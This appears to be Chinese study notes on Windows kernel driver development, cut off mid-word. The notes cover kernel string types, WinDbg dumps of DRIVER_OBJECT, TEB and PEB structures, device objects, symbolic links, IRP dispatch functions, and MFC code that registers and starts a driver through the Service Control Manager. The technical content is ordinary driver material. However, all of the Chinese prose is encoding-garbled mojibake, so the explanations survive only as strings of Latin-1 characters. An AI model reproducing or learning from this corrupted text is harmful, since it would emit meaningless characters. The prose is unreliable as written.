CPUä»»ä½•æ—¶åˆ»å¿…é¡»å¿…é¡»åœ¨IRQLä¸­å¤„äºæŸä¸€ç­‰çº§ã€‚ å†…æ ¸å­—ç¬¦ä¸²ç§ç±»\nåœ¨ç¼–å†™3ç¯ç¨‹åºæˆ‘ä»¬ç»å¸¸ç”¨ï¼šCHAR(char)/WCHAR(wchar_t)æ¥åˆ†åˆ«è¡¨ç¤ºå®…å­—ç¬¦ä¸²å’Œå®½å­—ç¬¦ä¸²ï¼Œç”¨0è¡¨ç¤ºç»“å°¾ã€‚ä½†æ˜¯åœ¨å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨ï¼šANSI_STRING/UNICODE_STRINGæ¥åˆ†åˆ«è¡¨ç¤ºå®…å­—ç¬¦ä¸²å’Œå®½å­—ç¬¦ä¸²ã€‚å®ƒä»¬çš„ç»“æ„å¦‚ä¸‹ï¼š\nANSI_STRINGå­—ç¬¦ä¸²ï¼š\ntypedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer; }STRING; UNICODE_STRINGå­—ç¬¦ä¸²ï¼š\ntypedef struct _UNICODE_STRING { USHORT Length; USHORT MaxmumLength; PWSTR Buffer; } UNICODE_STRING; å†…æ ¸å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°\nç¬¦ä¸²å¸¸ç”¨çš„åŠŸèƒ½æ— éå°±æ˜¯ï¼šåˆ›å»ºã€å¤åˆ¶ã€æ¯”è¾ƒä»¥åŠè½¬æ¢ç­‰ç­‰ã€‚\næ“ä½œ ANSI_STRINGå­—ç¬¦ä¸² UNICODE_STRINGå­—ç¬¦ä¸² åˆå§‹åŒ– RtlInitAnsiString RtlInitUnicodeString æ‹·è´ RtlCopyString RtlCopyUnicodeString æ¯”è¾ƒ RtlCompareString RtlCompareUnicodeString è½¬æ¢ RtlAnsiStringToUnicodeString RtlUnicodeStringToAnsiString å†…æ ¸ç©ºé—´ä¸å†…æ ¸æ¨¡å— ä¹‹å‰äº†è§£åˆ°ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰4GBè™šæ‹Ÿç©ºé—´ï¼Œè€Œä¸”ä½2GBæ‰€å¯¹åº”çš„ç‰©ç†é¡µåŸºæœ¬ä¸åŒï¼›é«˜2GBå†…å­˜æ‰€å¯¹åº”çš„ç‰©ç†é¡µåŸºæœ¬ç›¸åŒï¼ˆå…±ç”¨ï¼‰\nç¡¬ä»¶ç§ç±»ç¹å¤šï¼Œä¸å¯èƒ½åšä¸€ä¸ªå…¼å®¹æ‰€æœ‰ç¡¬ä»¶çš„å†…æ ¸ï¼Œæ‰€ä»¥ï¼Œå¾®è½¯æä¾›è§„å®šçš„æ¥å£æ ¼å¼ï¼Œè®©ç¡¬ä»¶é©±åŠ¨äººå‘˜å®‰è£…è§„å®šçš„æ ¼å¼ç¼–å†™é©±åŠ¨ç¨‹åº ã€‚\nåœ¨å†…æ ¸ä¸­ï¼Œè¿™äº›é©±åŠ¨ç¨‹åºæ¯ä¸€ä¸ªéƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œç§°ä¸ºå†…æ ¸æ¨¡å—ï¼Œéƒ½å¯ä»¥åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œéƒ½éµå®ˆPEç»“æ„ã€‚ä½†æœ¬è´¨ä¸Šè®²ï¼Œä»»æ„ä¸€ä¸ªsysæ–‡ä»¶ä¸å†…æ ¸æ–‡ä»¶æ²¡æœ‰åŒºåˆ«ã€‚æ¯ä¸ªé©±åŠ¨éƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ã€‚å°±å’Œåœ¨3ç¯çš„ç¨‹åºåŠ è½½dllä¸€æ ·ï¼ŒåŠ è½½ä¸€ä¸ªè´´ä¸Šä¸€ä¸ªã€‚\nåšç»ƒä¹ å¯ä»¥äº†è§£åˆ°å…¥å£å‡½æ•°ä¸ºNTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)ï¼Œéœ€è¦æ³¨æ„å®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼š\nDRIVER_OBJECTï¼ˆé©±åŠ¨å¯¹è±¡ï¼‰æè¿°äº†å½“å‰è¯¥æ¨¡å—çš„ä¸€äº›é‡è¦ä¿¡æ¯\nkd\u003e dt _DRIVER_OBJECT nt!_DRIVER_OBJECT +0x000 Type : Int2B +0x002 Size : Int2B +0x004 DeviceObject : Ptr32 _DEVICE_OBJECT +0x008 Flags : Uint4B +0x00c DriverStart : Ptr32 Void //é©±åŠ¨ä»å“ªé‡Œå¼€å§‹çš„ +0x010 DriverSize : Uint4B //éƒ¨ç½²çš„é©±åŠ¨æœ‰å¤šå¤§ +0x014 DriverSection : Ptr32 Void +0x018 DriverExtension : Ptr32 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING //é©±åŠ¨å«ä»€ä¹ˆåå­— +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING +0x028 FastIoDispatch : Ptr32 _FAST_IO_DISPATCH +0x02c DriverInit : Ptr32 long +0x030 DriverStartIo : Ptr32 void +0x034 DriverUnload : Ptr32 void +0x038 MajorFunction : [28] Ptr32 long è¯·æ³¨æ„é‡Œé¢çš„æˆå‘˜DriverSectionï¼Œä¸€ä¸ªæŒ‡é’ˆå¯¹åº”ç»“æ„ä½“çš„åŒå‘å¾ªç¯é“¾è¡¨LDR_DATA_TABLE_ENTRYï¼Œå®ƒåœˆç€å†…æ ¸é‡Œé¢çš„æ‰€æœ‰æ¨¡å—ï¼ˆå°±æ˜¯æŸ¥çœ‹æˆå‘˜InLoadOrderLinkså°±è¡Œäº†ï¼‰\nkd\u003e dt _LDR_DATA_TABLE_ENTRY nt!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING +0x034 Flags : Uint4B +0x038 LoadCount : Uint2B +0x03a TlsIndex : Uint2B +0x03c HashLinks : _LIST_ENTRY +0x03c SectionPointer : Ptr32 Void +0x040 CheckSum : Uint4B +0x044 TimeDateStamp : Uint4B +0x044 LoadedImports : Ptr32 Void +0x048 EntryPointActivationContext : Ptr32 Void +0x04c PatchInformation : Ptr32 Void æˆ‘ä»¬ä½¿ç”¨å·¥å…·å°†é©±åŠ¨åŠ è½½çš„ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆæ³¨å†Œé©±åŠ¨ï¼Œå°±æ˜¯åœ¨æ³¨å†Œè¡¨é‡Œé¢å†™ä¸Šé©±åŠ¨ï¼Œç¬¬äºŒä¸ªå‚æ•°reg_pathå°±æ˜¯å°†é©±åŠ¨å†™åœ¨æ³¨å†Œè¡¨é‡Œé¢çš„ä»€ä¹ˆåœ°æ–¹\nåœ¨3ç¯é‡Œé¢ï¼Œæœ‰ä¸€å—å†…å­˜æè¿°çº¿ç¨‹çš„ä¿¡æ¯ï¼Œå°±æ˜¯TEBã€‚FS:[0]å°±æŒ‡å‘è¿™ä¸ªç»“æ„ä½“ï¼š\nkd\u003e dt _TEB nt!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B +0x0c8 FpSoftwareStatusRegister : Uint4B +0x0cc SystemReserved1 : [54] Ptr32 Void +0x1a4 ExceptionCode : Int4B +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK +0x1bc SpareBytes1 : [24] UChar +0x1d4 GdiTebBatch : _GDI_TEB_BATCH +0x6b4 RealClientId : _CLIENT_ID +0x6bc GdiCachedProcessHandle : Ptr32 Void +0x6c0 GdiClientPID : Uint4B +0x6c4 GdiClientTID : Uint4B +0x6c8 GdiThreadLocalInfo : Ptr32 Void +0x6cc Win32ClientInfo : [62] Uint4B +0x7c4 glDispatchTable : [233] Ptr32 Void +0xb68 glReserved1 : [29] Uint4B +0xbdc glReserved2 : Ptr32 Void +0xbe0 glSectionInfo : Ptr32 Void +0xbe4 glSection : Ptr32 Void +0xbe8 glTable : Ptr32 Void +0xbec glCurrentRC : Ptr32 Void +0xbf0 glContext : Ptr32 Void +0xbf4 LastStatusValue : Uint4B +0xbf8 StaticUnicodeString : _UNICODE_STRING +0xc00 StaticUnicodeBuffer : [261] Uint2B +0xe0c DeallocationStack : Ptr32 Void +0xe10 TlsSlots : [64] Ptr32 Void +0xf10 TlsLinks : _LIST_ENTRY +0xf18 Vdm : Ptr32 Void +0xf1c ReservedForNtRpc : Ptr32 Void +0xf20 DbgSsReserved : [2] Ptr32 Void +0xf28 HardErrorsAreDisabled : Uint4B +0xf2c Instrumentation : [16] Ptr32 Void +0xf6c WinSockData : Ptr32 Void +0xf70 GdiBatchCount : Uint4B +0xf74 InDbgPrint : UChar +0xf75 FreeStackOnTermination : UChar +0xf76 HasFiberData : UChar +0xf77 IdealProcessor : UChar +0xf78 Spare3 : Uint4B +0xf7c ReservedForPerf : Ptr32 Void +0xf80 ReservedForOle : Ptr32 Void +0xf84 WaitingOnLoaderLock : Uint4B +0xf88 Wx86Thread : _Wx86ThreadState +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void +0xf98 ImpersonationLocale : Uint4B +0xf9c IsImpersonating : Uint4B +0xfa0 NlsCache : Ptr32 Void +0xfa4 pShimData : Ptr32 Void +0xfa8 HeapVirtualAffinity : Uint4B +0xfac CurrentTransactionHandle : Ptr32 Void +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME +0xfb4 SafeThunkCall : UChar +0xfb5 BooleanSpare : [3] UChar å¯ä»¥çœ‹åˆ°ï¼Œåœ¨TEBçš„æˆå‘˜ä¸­çš„0x30ï¼Œå­˜å‚¨ç€è¿›ç¨‹ç¯å¢ƒå—ï¼ˆPEBï¼‰ã€‚å®ƒæè¿°ç€è¿›ç¨‹é‡Œé¢çš„ä¿¡æ¯ï¼š\nkd\u003e dt _PEB nt!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 SpareBool : UChar +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : Ptr32 Void +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 FastPebLockRoutine : Ptr32 Void +0x024 FastPebUnlockRoutine : Ptr32 Void +0x028 EnvironmentUpdateCount : Uint4B +0x02c KernelCallbackTable : Ptr32 Void +0x030 SystemReserved : [1] Uint4B +0x034 AtlThunkSListPtr32 : Uint4B +0x038 FreeList : Ptr32 _PEB_FREE_BLOCK +0x03c TlsExpansionCounter : Uint4B +0x040 TlsBitmap : Ptr32 Void +0x044 TlsBitmapBits : [2] Uint4B +0x04c ReadOnlySharedMemoryBase : Ptr32 Void +0x050 ReadOnlySharedMemoryHeap : Ptr32 Void +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void +0x058 AnsiCodePageData : Ptr32 Void +0x05c OemCodePageData : Ptr32 Void +0x060 UnicodeCaseTableData : Ptr32 Void +0x064 NumberOfProcessors : Uint4B +0x068 NtGlobalFlag : Uint4B +0x070 CriticalSectionTimeout : _LARGE_INTEGER +0x078 HeapSegmentReserve : Uint4B +0x07c HeapSegmentCommit : Uint4B +0x080 HeapDeCommitTotalFreeThreshold : Uint4B +0x084 HeapDeCommitFreeBlockThreshold : Uint4B +0x088 NumberOfHeaps : Uint4B +0x08c MaximumNumberOfHeaps : Uint4B +0x090 ProcessHeaps : Ptr32 Ptr32 Void +0x094 GdiSharedHandleTable : Ptr32 Void +0x098 ProcessStarterHelper : Ptr32 Void +0x09c GdiDCAttributeList : Uint4B +0x0a0 LoaderLock : Ptr32 Void +0x0a4 OSMajorVersion : Uint4B +0x0a8 OSMinorVersion : Uint4B +0x0ac OSBuildNumber : Uint2B +0x0ae OSCSDVersion : Uint2B +0x0b0 OSPlatformId : Uint4B +0x0b4 ImageSubsystem : Uint4B +0x0b8 ImageSubsystemMajorVersion : Uint4B +0x0bc ImageSubsystemMinorVersion : Uint4B +0x0c0 ImageProcessAffinityMask : Uint4B +0x0c4 GdiHandleBuffer : [34] Uint4B +0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void +0x154 TlsExpansionBitmapBits : [32] Uint4B +0x1d4 SessionId : Uint4B +0x1d8 AppCompatFlags : _ULARGE_INTEGER +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER +0x1e8 pShimData : Ptr32 Void +0x1ec AppCompatInfo : Ptr32 Void +0x1f0 CSDVersion : _UNICODE_STRING +0x1f8 ActivationContextData : Ptr32 Void +0x1fc ProcessAssemblyStorageMap : Ptr32 Void +0x200 SystemDefaultActivationContextData : Ptr32 Void +0x204 SystemAssemblyStorageMap : Ptr32 Void +0x208 MinimumStackCommit : Uint4B çœ‹PEBï¼Œé‡Œé¢0x00cå¤„çš„Ldrï¼Œé‡Œé¢å­˜æ”¾ç€3ä¸ªé“¾è¡¨ï¼š\nkd\u003e dt _PEB_LDR_DATA nt!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY //\u003c=ç¬¬ä¸€ä¸ªï¼ˆåŠ è½½é¡ºåºï¼‰ +0x014 InMemoryOrderModuleList : _LIST_ENTRY //\u003c=ç¬¬äºŒä¸ªï¼ˆå†…å­˜é¡ºåºï¼‰ +0x01c InInitializationOrderModuleList : _LIST_ENTRY //\u003c=ç¬¬ä¸‰ä¸ªï¼ˆåˆå§‹åŒ–é¡ºåºï¼‰ +0x024 EntryInProgress : Ptr32 Void è¿™ä¸‰ä¸ªé“¾è¡¨è®°å½•äº†å½“å‰è¿›ç¨‹æœ‰å“ªäº›æ¨¡å—ï¼Œä¸0ç¯çš„LDR_DATA_TABLE_ENTRYç±»ä¼¼\n0ç¯ä¸3ç¯é€šä¿¡ï¼ˆå¸¸è§„æ–¹å¼ï¼‰ è®¾å¤‡å¯¹è±¡\næˆ‘ä»¬åœ¨å¼€å‘çª—å£ç¨‹åºçš„æ—¶å€™ï¼Œæ¶ˆæ¯è¢«å°è£…æˆä¸€ä¸ªç»“æ„ä½“ï¼šMSGã€‚åœ¨å†…æ ¸å¼€å‘æ—¶ï¼Œæ¶ˆæ¯è¢«å°è£…æˆå¦å¤–ä¸€ä¸ªç»“æ„ä½“ï¼šIRPï¼ˆI/O Request Packageï¼‰ã€‚\nåœ¨çª—å£ç¨‹åºä¸­ï¼Œèƒ½å¤Ÿæ¥æ”¶æ¶ˆæ¯çš„åªèƒ½æ˜¯çª—å£å¯¹è±¡ã€‚åœ¨å†…æ ¸ä¸­ï¼Œèƒ½å¤Ÿæ¥æ”¶IRPæ¶ˆæ¯çš„åªèƒ½æ˜¯è®¾å¤‡å¯¹è±¡ã€‚\né€šä¿¡æµç¨‹\nåˆ›å»ºè®¾å¤‡å¯¹è±¡\nå¦‚ä½•ç†è§£ï¼šæ­£å¸¸æ¥è¯´ä¸€ä¸ªè®¾å¤‡å¯¹è±¡å¯¹åº”ä¸€ä¸ªç¡¬ä»¶ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä»€ä¹ˆéƒ½ä¸å¯¹åº”ï¼Œå°±æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼šåªæœ‰ç»“æ„ä½“æ²¡æœ‰ç¡¬ä»¶\n//åˆ›å»ºè®¾å¤‡åç§° UNICODE_STRING Devicename; RtlInitUnicodeString(\u0026Devicename,L\"\\\\Device\\\\MyDevice\"); //åˆ›å»ºè®¾å¤‡ IoCreateDevice( pDriver, //å½“å‰è®¾å¤‡æ‰€å±çš„é©±åŠ¨å¯¹è±¡ï¼Œä¸€ä¸ªè®¾å¤‡å¯¹è±¡å¿…é¡»å±äºæŸä¸€ä¸ªé©±åŠ¨å¯¹è±¡ 0, \u0026Devicename, //è®¾å¤‡å¯¹è±¡çš„åç§° FILE_DEVICE_UNKNOWN, //æ²¡æœ‰å¯¹åº”çš„è®¾å¤‡å°±æ˜¯è¿™ä¸ªUNKNOWN FILE_DEVICE_SECURE_OPEN, FALSE, \u0026pDeviceObj //è®¾å¤‡å¯¹è±¡æŒ‡é’ˆ ); è®¾ç½®äº¤äº’æ•°æ®çš„æ–¹å¼\npDeviceObj-\u003eFlags |= DO_BUFFERED_IO; ç¼“å†²åŒºæ–¹å¼è¯»å†™(DO_BUFFERED_IO) ï¼šæ“ä½œç³»ç»Ÿå°†åº”ç”¨ç¨‹åºæä¾›ç¼“å†²åŒºçš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸æ¨¡å¼ä¸‹çš„åœ°å€ä¸­ã€‚\nç›´æ¥æ–¹å¼è¯»å†™(DO_DIRECT_IO) ï¼šæ“ä½œç³»ç»Ÿä¼šå°†ç”¨æˆ·æ¨¡å¼ä¸‹çš„ç¼“å†²åŒºé”ä½ã€‚ç„¶åæ“ä½œç³»ç»Ÿå°†è¿™æ®µç¼“å†²åŒºåœ¨å†…æ ¸æ¨¡å¼åœ°å€å†æ¬¡æ˜ å°„ä¸€éã€‚è¿™æ ·ï¼Œç”¨æˆ·æ¨¡å¼çš„ç¼“å†²åŒºå’Œå†…æ ¸æ¨¡å¼çš„ç¼“å†²åŒºæŒ‡å‘çš„æ˜¯åŒä¸€åŒºåŸŸçš„ç‰©ç†å†…å­˜ã€‚ç¼ºç‚¹å°±æ˜¯è¦å•ç‹¬å ç”¨ç‰©ç†é¡µé¢ã€‚\nå…¶ä»–æ–¹å¼è¯»å†™ï¼ˆåœ¨è°ƒç”¨IoCreateDeviceåˆ›å»ºè®¾å¤‡åå¯¹pDevObj-\u003eFlagså³ä¸è®¾ç½®DO_BUFFERED_IOä¹Ÿä¸è®¾ç½®DO_DIRECT_IOæ­¤æ—¶å°±æ˜¯å…¶ä»–æ–¹å¼ã€‚ï¼‰\nåœ¨ä½¿ç”¨å…¶ä»–æ–¹å¼è¯»å†™è®¾å¤‡æ—¶ï¼Œæ´¾é£å‡½æ•°ç›´æ¥è¯»å†™åº”ç”¨ç¨‹åºæä¾›çš„ç¼“å†²åŒºåœ°å€ã€‚åœ¨é©±åŠ¨ç¨‹åºä¸­ï¼Œç›´æ¥æ“ä½œåº”ç”¨ç¨‹åºçš„ç¼“å†²åŒºåœ°å€æ˜¯å¾ˆå±é™©çš„ã€‚åªæœ‰é©±åŠ¨ç¨‹åºä¸åº”ç”¨ç¨‹åºè¿è¡Œåœ¨ç›¸åŒçº¿ç¨‹ä¸Šä¸‹æ–‡çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚å¦‚æœCPUä¸­çš„ä»»åŠ¡åˆ‡æ¢äº†ï¼Œå³CR3åˆ‡æ¢æ‰äº†ï¼Œåœ¨é«˜2GBçš„é©±åŠ¨ä»åœ¨ä½¿ç”¨è¯¥æ–¹å¼è¯»å–ä½2GBå†…å­˜ï¼Œå¯¼è‡´è¯»åˆ°çš„æ•°æ®å’Œå®é™…ä¸ç¬¦ï¼Œå¯¼è‡´é”™è¯¯ï¼Œæ•…å¼ºçƒˆä¸æ¨èæ­¤æ–¹å¼ã€‚\nåˆ›å»ºç¬¦å·é“¾æ¥\nå°±æ˜¯è®©3ç¯çš„ç¨‹åºæ‰¾åˆ°ä½ çš„é©±åŠ¨å¯¹è±¡ã€‚è®¾å¤‡åç§°çš„ä½œç”¨æ˜¯ç»™å†…æ ¸å¯¹è±¡ç”¨çš„ï¼Œå¦‚æœè¦åœ¨3ç¯è®¿é—®ï¼Œå¿…é¡»è¦æœ‰ç¬¦å·é“¾æ¥ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªåˆ«åï¼Œæ²¡æœ‰è¿™ä¸ªåˆ«åï¼Œåœ¨3ç¯ä¸å¯è§ã€‚\n//åˆ›å»ºç¬¦å·é“¾æ¥åç§° RtlInitUnicodeString(\u0026SymbolicLinkName,L\"\\\\??\\\\MyTestDriver\"); //åˆ›å»ºç¬¦å·é“¾æ¥ IoCreateSymbolicLink(\u0026SymbolicLinkName,\u0026Devicename); å†…æ ¸æ¨¡å¼ä¸‹ï¼Œç¬¦å·é“¾æ¥æ˜¯ä»¥\\??\\å¼€å¤´çš„ï¼Œå¦‚Cç›˜å°±æ˜¯\\??\\C:ã€‚è€Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œåˆ™æ˜¯ä»¥\\\\.\\å¼€å¤´çš„ï¼Œå¦‚Cç›˜å°±æ˜¯\\\\.\\C:\nIRP\nç±»æ¯”ä¸€ä¸‹ï¼Œåœ¨å›¾å½¢ç•Œé¢ä¸Šæ˜¯é€šè¿‡é¼ æ ‡å•å‡»æˆ–åŒæœºæ¥è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œè€Œåœ¨å†…æ ¸é‡Œé¢åˆ™æ˜¯é€šè¿‡è°ƒç”¨å¯¹åº”çš„å‡½æ•°æ¥æ‰§è¡Œæ´¾é£å‡½æ•°çš„\nåœ¨3ç¯è°ƒç”¨CreateFileå‡½æ•°ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šå°è£…ä¸€ä¸ªIRPæ´¾å‘ç»™è®¾å¤‡å¯¹è±¡ï¼Œè®¾å¤‡å¯¹è±¡é€šè¿‡IRPçš„ç±»å‹è°ƒç”¨å¯¹åº”çš„æ´¾å‘å‡½æ•°ã€‚\nå½“åº”ç”¨å±‚é€šè¿‡CreateFileã€ReadFileã€WriteFileã€CloseHandleç­‰å‡½æ•°æ‰“å¼€ã€ä»è®¾å¤‡è¯»å–æ•°æ®ã€å‘è®¾å¤‡å†™å…¥æ•°æ®ã€å…³é—­è®¾å¤‡çš„æ—¶å€™ï¼Œä¼šä½¿æ“ä½œç³»ç»Ÿåˆ†åˆ«äº§ç”Ÿå‡ºIRP_MJ_CREATEã€IRP_MJ_READã€IRP_MJ_WRITEã€IRP_MJ_CLOSEç­‰ä¸åŒçš„IRPã€‚\nå…¶ä»–ç±»å‹çš„IRPï¼š\nIRPç±»å‹ æ¥æº IRP_MJ_DEVICE_CONTROL ä½¿ç”¨ DeviceControl å‡½æ•°æ—¶äº§ç”Ÿï¼ˆæœ€å¤šçš„æ–¹å¼ï¼‰ IRP_MJ_POWER åœ¨æ“ä½œç³»ç»Ÿå¤„ç†ç”µæºæ¶ˆæ¯æ—¶äº§ç”Ÿ IRP_MJ_SHUTDOWN å…³é—­ç³»ç»Ÿå‰æ—¶äº§ç”Ÿ æ´¾é£å‡½æ•°\nå¦‚ä½•æ³¨å†Œæ´¾é£å‡½æ•°ï¼šå…¶å®æ¯ä¸€ä¸ªIRPéƒ½å¯¹åº”ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆä½ æä¾›çš„æ´¾é£å‡½æ•°å°±åº”è¯¥å†™åœ¨æˆå‘˜MajorFunctionä¸‹æ ‡å¯¹åº”çš„ä½ç½®ã€‚\nkd\u003e dt _DRIVER_OBJECT ntdll!_DRIVER_OBJECT +0x000 Type : Int2B +0x002 Size : Int2B +0x004 DeviceObject : Ptr32 _DEVICE_OBJECT +0x008 Flags : Uint4B +0x00c DriverStart : Ptr32 Void +0x010 DriverSize : Uint4B +0x014 DriverSection : Ptr32 Void +0x018 DriverExtension : Ptr32 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING +0x028 FastIoDispatch : Ptr32 _FAST_IO_DISPATCH +0x02c DriverInit : Ptr32 long +0x030 DriverStartIo : Ptr32 void +0x034 DriverUnload : Ptr32 void +0x038 MajorFunction : [28] Ptr32 long ä»£ç å½¢å¼ï¼š\n//è®¾ç½®å¸è½½å‡½æ•° pDriverObject-\u003eDriverUnload = å¸è½½å‡½æ•°; //è®¾ç½®æ´¾é£å‡½æ•° pDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = æ´¾é£å‡½æ•°1; pDriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = æ´¾é£å‡½æ•°2; pDriverObject-\u003eMajorFunction[IRP_MJ_WRITE] = æ´¾é£å‡½æ•°3; pDriverObject-\u003eMajorFunction[IRP_MJ_READ] = æ´¾é£å‡½æ•°4; pDriverObject-\u003eMajorFunction[IRP_MJ_CLEANUP] = æ´¾é£å‡½æ•°5; pDriverObject-\u003eMajorFunction[IRP_MJ_SET_INFORMATION] = æ´¾é£å‡½æ•°6; pDriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = æ´¾é£å‡½æ•°7; pDriverObject-\u003eMajorFunction[IRP_MJ_SHUTDOWN] = æ´¾é£å‡½æ•°8; pDriverObject-\u003eMajorFunction[IRP_MJ_SYSTEM_CONTROL] = æ´¾é£å‡½æ•°9; æ´¾é£å‡½æ•°çš„æ ¼å¼\nNTSTATUS MyDispatchFunction(PDEVICE_OBJECT pDevObj, PIRP pIrp) { //å¤„ç†è‡ªå·±çš„ä¸šåŠ¡â€¦â€¦ //è®¾ç½®è¿”å›çŠ¶æ€ pIrp-\u003eIoStatus.Status = STATUS_SUCCESS; //GetLastError() å‡½æ•°å¾—åˆ°çš„å°±æ˜¯è¯¥å€¼ pIrp-\u003eIoStatus.Information = 0; //è¿”å›ç»™3ç¯å¤šå°‘æ•°æ® æ²¡æœ‰å¡«0 IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS; } é©±åŠ¨å¸¸ç”¨åŠ è½½æ–¹å¼ æ³¨å†Œé©±åŠ¨\nvoid CDriverLoadDlg::OnBnRegister() { CString path = this-\u003egetFilePath(); this-\u003escMageger = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (this-\u003escMageger == NULL) { MessageBox(__T(\"æç¤º\"), __T(\"æœåŠ¡ç®¡ç†æ‰“å¼€å¤±è´¥\")); return; } if (path.IsEmpty()) { MessageBox(_T(\"æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = CreateService(this-\u003escMageger, fileName, fileName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL); //åˆ›å»ºä¸€ä¸ªæœåŠ¡å¯¹è±¡ if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_EXISTS) { MessageBox(_T(\"æœåŠ¡å·²ç»å­˜åœ¨ä¸éœ€è¦åˆ›å»ºäº†\"), _T(\"æç¤º\")); } else { CString str; str.Format(L\"é”™è¯¯å·ä¸º:%d\", error); MessageBox(str, _T(\"æç¤º\")); OutputDebugString(str); } return; } CloseServiceHandle(serviceHandle); } å…¶ä¸­OpenSCManageræ˜¯å»ºç«‹ä¸æœ¬åœ°è®¡ç®—æœºä¸Šçš„æœåŠ¡æ§åˆ¶ç®¡ç†å™¨çš„è¿æ¥ï¼ŒCreateServiceæ˜¯åˆ›å»ºä¸€ä¸ªæœåŠ¡å¯¹è±¡ã€‚\nè¿è¡Œé©±åŠ¨\nvoid CDriverLoadDlg::OnBnRun() { CString path = this-\u003egetFilePath();; if (path.IsEmpty()) { MessageBox(_T(\"æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"è¯·é‡æ–°å¯åŠ¨ï¼ŒæœåŠ¡å™¨æ‰“å¼€å¤±è´¥\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox( _T(\"æœåŠ¡å·²ç»ä¸å­˜åœ¨\"),_T(\"æç¤º\")); } else { CString str(\"é”™è¯¯å·ä¸º:\"+error); MessageBox(str, _T(\"æç¤º\")); } return; } int result = StartService(serviceHandle, 0, NULL); if (result == 0) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_ALREADY_RUNNING) { MessageBox(_T(\"å·²ç»è¿è¡Œ\"),_T(\"æç¤º\")); return; } } CloseServiceHandle(serviceHandle); } æ‰“å¼€æœåŠ¡ä¹‹åå¼€å§‹æœåŠ¡å°±æ­£å¸¸è¿è¡Œäº†ã€‚\nåœæ­¢é©±åŠ¨\nvoid CDriverLoadDlg::OnBnStop() { CString path = this-\u003egetFilePath(); if (path.IsEmpty()) { MessageBox(_T(\"æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\"), _T(\"ä½ 